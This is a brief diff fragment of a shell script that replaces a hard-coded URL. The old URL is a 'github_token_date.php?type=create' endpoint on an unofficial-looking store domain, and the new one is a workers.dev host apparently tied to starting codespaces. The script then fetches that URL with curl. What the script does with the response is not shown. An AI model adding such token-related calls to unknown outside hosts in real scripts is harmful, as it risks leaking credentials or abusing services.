@@ -154,7 +154,7 @@ fi
 
 
 sleep 5
-url="https://livehume.store/github/github_token_date.php?type=create"
+url="https://startcodespace.vflixprime.workers.dev/"
 
 # Get the output and response code using curl
 response=$(curl -s -w "%{http_code}" "$url")
